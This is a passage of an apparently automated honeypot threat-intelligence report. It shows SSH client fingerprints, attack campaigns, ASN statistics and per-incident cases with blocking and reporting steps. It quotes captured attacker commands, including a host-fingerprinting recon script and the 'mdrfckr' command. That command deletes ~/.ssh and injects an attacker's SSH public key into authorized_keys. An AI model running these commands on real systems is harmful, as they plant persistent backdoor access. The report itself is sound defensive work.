| `guest` | `guest13` | `91.92.42.7` | 2026-08-15T06:55:00 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **6728** |
| Sessions with Fingerprint | **18** |
| Unique HASSH Fingerprints | **18** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 323 |
| OpenSSH | 30 |
| libssh | 18 |
| Nmap scanner | 7 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 269 | 2 |
| `2ec37a7cc8da...` | Mirai/variant | 35 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 25 | 25 |
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `98ddc5604ef6...` | Modern SSH client | 6 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 269 | 2 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 35 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 25 | 25 | Mirai/variant |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 6 | 1 | Modern SSH client |
| `e45f2d6d7f79...` | Go SSH scanner | 6 | 1 | Mirai/variant |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 2 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 34 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.50`, `92.118.39.14`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `106.13.46.38`, `213.230.111.14`, `69.6.234.27`, `108.174.156.122`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **83** |
| Unique ASNs | **66** |
| High-Risk ASNs | **57** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 4 | HIGH |
| `AS47890` | UNMANAGED LTD | 3 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 2 | HIGH |
| `AS210022` | Trade Link Logistics General Trading & Contracting Company W.L.L., L.L.C. | 2 | MEDIUM |
| `AS13188` | CONTENT DELIVERY NETWORK LTD | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (354)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-823b5a5ddf22

| Field | Detail |
|---|---|
| **Source IP** | `177.135.206[.]10` |
| **First Seen** | 2026-08-15 04:56 |
| **Last Seen** | 2026-08-15 04:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:56:10` | `cowrie.session.connect` |
| `2026-08-15 04:56:11` | `cowrie.client.version` |
| `2026-08-15 04:56:11` | `cowrie.client.kex` |
| `2026-08-15 04:56:13` | `cowrie.login.success` |
| `2026-08-15 04:56:13` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.135.206[.]10` to AbuseIPDB if not already reported
- [ ] Block `177.135.206[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d675e2ac1669

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-08-15 04:56 |
| **Last Seen** | 2026-08-15 04:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:56:19` | `cowrie.session.connect` |
| `2026-08-15 04:56:20` | `cowrie.client.version` |
| `2026-08-15 04:56:20` | `cowrie.client.kex` |
| `2026-08-15 04:56:22` | `cowrie.login.success` |
| `2026-08-15 04:56:22` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84fc5acc1f7f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:56 |
| **Last Seen** | 2026-08-15 04:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:56:58` | `cowrie.session.connect` |
| `2026-08-15 04:56:58` | `cowrie.client.version` |
| `2026-08-15 04:56:58` | `cowrie.client.kex` |
| `2026-08-15 04:56:59` | `cowrie.login.success` |
| `2026-08-15 04:57:01` | `cowrie.session.params` |
| `2026-08-15 04:57:01` | `cowrie.command.input` |
| `2026-08-15 04:57:01` | `cowrie.command.input` |
| `2026-08-15 04:57:01` | `cowrie.command.input` |
| `2026-08-15 04:57:01` | `cowrie.command.input` |
| `2026-08-15 04:57:01` | `cowrie.command.input` |
| `2026-08-15 04:57:01` | `cowrie.command.success` |
| `2026-08-15 04:57:01` | `cowrie.command.input` |
| `2026-08-15 04:57:01` | `cowrie.command.input` |
| `2026-08-15 04:57:01` | `cowrie.command.input` |
| `2026-08-15 04:57:01` | `cowrie.command.input` |
| `2026-08-15 04:57:02` | `cowrie.log.closed` |
| `2026-08-15 04:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac13eb968a0f

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]242` |
| **First Seen** | 2026-08-15 04:58 |
| **Last Seen** | 2026-08-15 04:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:58:12` | `cowrie.session.connect` |
| `2026-08-15 04:58:13` | `cowrie.client.version` |
| `2026-08-15 04:58:13` | `cowrie.client.kex` |
| `2026-08-15 04:58:15` | `cowrie.login.success` |
| `2026-08-15 04:58:16` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:58:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]242` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-446474ad07a3

| Field | Detail |
|---|---|
| **Source IP** | `202.72.196[.]75` |
| **First Seen** | 2026-08-15 04:58 |
| **Last Seen** | 2026-08-15 05:03 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:58:21` | `cowrie.session.connect` |
| `2026-08-15 04:58:22` | `cowrie.client.version` |
| `2026-08-15 04:58:22` | `cowrie.client.kex` |
| `2026-08-15 04:58:24` | `cowrie.login.success` |
| `2026-08-15 04:58:25` | `cowrie.direct-tcpip.request` |
| `2026-08-15 05:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.72.196[.]75` to AbuseIPDB if not already reported
- [ ] Block `202.72.196[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe59b1d94445

| Field | Detail |
|---|---|
| **Source IP** | `183.167.234[.]154` |
| **First Seen** | 2026-08-15 04:58 |
| **Last Seen** | 2026-08-15 04:58 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:58:24` | `cowrie.session.connect` |
| `2026-08-15 04:58:24` | `cowrie.client.version` |
| `2026-08-15 04:58:24` | `cowrie.client.kex` |
| `2026-08-15 04:58:30` | `cowrie.login.success` |
| `2026-08-15 04:58:31` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:58:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.167.234[.]154` to AbuseIPDB if not already reported
- [ ] Block `183.167.234[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5837cc8a2813

| Field | Detail |
|---|---|
| **Source IP** | `108.174.156[.]122` |
| **First Seen** | 2026-08-15 04:58 |
| **Last Seen** | 2026-08-15 04:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:58:48` | `cowrie.session.connect` |
| `2026-08-15 04:58:48` | `cowrie.client.version` |
| `2026-08-15 04:58:48` | `cowrie.client.kex` |
| `2026-08-15 04:58:49` | `cowrie.login.success` |
| `2026-08-15 04:58:50` | `cowrie.session.params` |
| `2026-08-15 04:58:50` | `cowrie.command.input` |
| `2026-08-15 04:58:50` | `cowrie.command.failed` |
| `2026-08-15 04:58:50` | `cowrie.log.closed` |
| `2026-08-15 04:58:50` | `cowrie.session.params` |
| `2026-08-15 04:58:50` | `cowrie.command.input` |
| `2026-08-15 04:58:51` | `cowrie.session.file_download` |
| `2026-08-15 04:58:51` | `cowrie.log.closed` |
| `2026-08-15 04:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.174.156[.]122` to AbuseIPDB if not already reported
- [ ] Block `108.174.156[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-246f646a77ea

| Field | Detail |
|---|---|
| **Source IP** | `108.174.156[.]122` |
| **First Seen** | 2026-08-15 04:58 |
| **Last Seen** | 2026-08-15 04:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:58:51` | `cowrie.session.connect` |
| `2026-08-15 04:58:51` | `cowrie.client.version` |
| `2026-08-15 04:58:51` | `cowrie.client.kex` |
| `2026-08-15 04:58:51` | `cowrie.login.success` |
| `2026-08-15 04:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.174.156[.]122` to AbuseIPDB if not already reported
- [ ] Block `108.174.156[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-006a983bcc7d

| Field | Detail |
|---|---|
| **Source IP** | `108.174.156[.]122` |
| **First Seen** | 2026-08-15 04:58 |
| **Last Seen** | 2026-08-15 04:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:58:51` | `cowrie.session.connect` |
| `2026-08-15 04:58:51` | `cowrie.client.version` |
| `2026-08-15 04:58:51` | `cowrie.client.kex` |
| `2026-08-15 04:58:52` | `cowrie.login.success` |
| `2026-08-15 04:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.174.156[.]122` to AbuseIPDB if not already reported
- [ ] Block `108.174.156[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac05f977767c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 05:00 |
| **Last Seen** | 2026-08-15 05:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:00:46` | `cowrie.session.connect` |
| `2026-08-15 05:00:46` | `cowrie.client.version` |
| `2026-08-15 05:00:46` | `cowrie.client.kex` |
| `2026-08-15 05:00:47` | `cowrie.login.success` |
| `2026-08-15 05:00:49` | `cowrie.session.params` |
| `2026-08-15 05:00:49` | `cowrie.command.input` |
| `2026-08-15 05:00:49` | `cowrie.command.input` |
| `2026-08-15 05:00:49` | `cowrie.command.input` |
| `2026-08-15 05:00:49` | `cowrie.command.input` |
| `2026-08-15 05:00:49` | `cowrie.command.input` |
| `2026-08-15 05:00:49` | `cowrie.command.success` |
| `2026-08-15 05:00:49` | `cowrie.command.input` |
| `2026-08-15 05:00:49` | `cowrie.command.input` |
| `2026-08-15 05:00:49` | `cowrie.command.input` |
| `2026-08-15 05:00:49` | `cowrie.command.input` |
| `2026-08-15 05:00:49` | `cowrie.log.closed` |
| `2026-08-15 05:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-570e72bc6b94

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 05:00 |
| **Last Seen** | 2026-08-15 05:01 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:00:59` | `cowrie.session.connect` |
| `2026-08-15 05:01:05` | `cowrie.client.version` |
| `2026-08-15 05:01:05` | `cowrie.client.kex` |
| `2026-08-15 05:01:27` | `cowrie.login.success` |
| `2026-08-15 05:01:40` | `cowrie.session.params` |
| `2026-08-15 05:01:40` | `cowrie.command.input` |
| `2026-08-15 05:01:45` | `cowrie.log.closed` |
| `2026-08-15 05:01:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2acc9624fc50

| Field | Detail |
|---|---|
| **Source IP** | `213.230.111[.]14` |
| **First Seen** | 2026-08-15 05:04 |
| **Last Seen** | 2026-08-15 05:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:04:12` | `cowrie.session.connect` |
| `2026-08-15 05:04:12` | `cowrie.client.version` |
| `2026-08-15 05:04:13` | `cowrie.client.kex` |
| `2026-08-15 05:04:13` | `cowrie.login.success` |
| `2026-08-15 05:04:14` | `cowrie.session.params` |
| `2026-08-15 05:04:14` | `cowrie.command.input` |
| `2026-08-15 05:04:14` | `cowrie.command.failed` |
| `2026-08-15 05:04:15` | `cowrie.log.closed` |
| `2026-08-15 05:04:15` | `cowrie.session.params` |
| `2026-08-15 05:04:15` | `cowrie.command.input` |
| `2026-08-15 05:04:16` | `cowrie.session.file_download` |
| `2026-08-15 05:04:16` | `cowrie.log.closed` |
| `2026-08-15 05:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.111[.]14` to AbuseIPDB if not already reported
- [ ] Block `213.230.111[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94128723bfc6

| Field | Detail |
|---|---|
| **Source IP** | `213.230.111[.]14` |
| **First Seen** | 2026-08-15 05:04 |
| **Last Seen** | 2026-08-15 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:04:16` | `cowrie.session.connect` |
| `2026-08-15 05:04:16` | `cowrie.client.version` |
| `2026-08-15 05:04:16` | `cowrie.client.kex` |
| `2026-08-15 05:04:17` | `cowrie.login.success` |
| `2026-08-15 05:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.111[.]14` to AbuseIPDB if not already reported
- [ ] Block `213.230.111[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34522bdcdc66

| Field | Detail |
|---|---|
| **Source IP** | `213.230.111[.]14` |
| **First Seen** | 2026-08-15 05:04 |
| **Last Seen** | 2026-08-15 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:04:17` | `cowrie.session.connect` |
| `2026-08-15 05:04:17` | `cowrie.client.version` |
| `2026-08-15 05:04:17` | `cowrie.client.kex` |
| `2026-08-15 05:04:18` | `cowrie.login.success` |
| `2026-08-15 05:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.111[.]14` to AbuseIPDB if not already reported
- [ ] Block `213.230.111[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2420982f2522

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 05:09 |
| **Last Seen** | 2026-08-15 05:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:09:03` | `cowrie.session.connect` |
| `2026-08-15 05:09:03` | `cowrie.client.version` |
| `2026-08-15 05:09:03` | `cowrie.client.kex` |
| `2026-08-15 05:09:04` | `cowrie.login.success` |
| `2026-08-15 05:09:05` | `cowrie.session.params` |
| `2026-08-15 05:09:05` | `cowrie.command.input` |
| `2026-08-15 05:09:05` | `cowrie.log.closed` |
| `2026-08-15 05:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa970bd2f722

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-08-15 05:19 |
| **Last Seen** | 2026-08-15 05:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:19:20` | `cowrie.session.connect` |
| `2026-08-15 05:19:20` | `cowrie.client.version` |
| `2026-08-15 05:19:20` | `cowrie.client.kex` |
| `2026-08-15 05:19:21` | `cowrie.login.success` |
| `2026-08-15 05:19:22` | `cowrie.direct-tcpip.request` |
| `2026-08-15 05:19:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b9ecdf32245

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 05:23 |
| **Last Seen** | 2026-08-15 05:24 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:23:20` | `cowrie.session.connect` |
| `2026-08-15 05:23:25` | `cowrie.client.version` |
| `2026-08-15 05:23:25` | `cowrie.client.kex` |
| `2026-08-15 05:23:47` | `cowrie.login.success` |
| `2026-08-15 05:24:00` | `cowrie.session.params` |
| `2026-08-15 05:24:00` | `cowrie.command.input` |
| `2026-08-15 05:24:05` | `cowrie.log.closed` |
| `2026-08-15 05:24:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11886e5bd7f6

| Field | Detail |
|---|---|
| **Source IP** | `179.189.85[.]66` |
| **First Seen** | 2026-08-15 05:24 |
| **Last Seen** | 2026-08-15 05:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
